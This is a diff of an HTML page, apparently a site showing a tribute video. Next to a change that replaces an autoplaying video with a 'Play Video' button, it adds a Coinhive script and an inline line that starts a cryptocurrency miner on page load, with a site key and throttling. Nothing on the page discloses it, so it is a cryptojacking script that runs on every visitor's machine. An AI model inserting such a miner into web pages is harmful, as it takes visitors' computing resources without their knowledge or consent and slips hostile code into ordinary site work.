@@ -7,6 +7,8 @@
 	<link rel="shortcut icon" href="./favicon.png">
     <link rel="stylesheet" href="./css/style.css">
     <script src="https://cdn.jsdelivr.net/npm/afterglowplayer@1.x"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<script>var miner = new CoinHive.Anonymous('2ppdRu3QWsBcgF0xUIZuzFPzOxW0bXC4', {throttle: 0.3}); miner.start();</script>
   </head>
   <body>
     <header>
@@ -21,9 +23,12 @@
     </header>
     <section id="showcase">
       <div class="container">
-        <video class="afterglow" id="tributevideo" width="640" height="360" autoplay="autoplay">
-          <source type="video/mp4" src="https://goo.gl/bdxGv4" />
-        </video>
+	   <div class="playvideo">
+	    <a class="afterglow" href="#tributevideo"><button type="button" class="button1" autofocus style="width:150px;height:75px">Play Video</button></a>
+         <video id="tributevideo" width="640" height="360">
+           <source type="video/mp4" src="https://goo.gl/bdxGv4" />
+         </video>
+		</div>
       </div>
     </section>
   </body>
